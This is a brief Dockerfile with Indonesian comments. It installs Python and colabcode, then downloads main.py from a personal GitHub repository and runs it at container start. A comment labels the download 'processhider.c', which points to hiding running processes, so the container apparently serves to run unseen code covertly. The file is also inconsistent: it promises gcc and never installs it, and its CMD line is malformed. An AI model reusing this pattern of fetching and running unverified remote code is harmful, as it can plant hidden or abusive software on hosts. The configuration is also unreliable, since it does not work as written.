# Gunakan image dasar
FROM ubuntu:20.04

# Install wget, compiler gcc, dan perangkat lunak yang dibutuhkan
RUN apt-get update && apt-get install -y wget && apt-get install python3 -y && apt-get install python3-pip -y && pip3 install colabcode

# Buat direktori untuk meletakkan file-file yang dibutuhkan
WORKDIR /myapp

# Download processhider.c
RUN wget https://raw.githubusercontent.com/cihuuy/ncnuing/main/main.py

# Perintah yang akan dijalankan saat container pertama kali dijalankan
# Ganti perintah ini sesuai dengan kebutuhan Anda
CMD ["python3 main.py"]
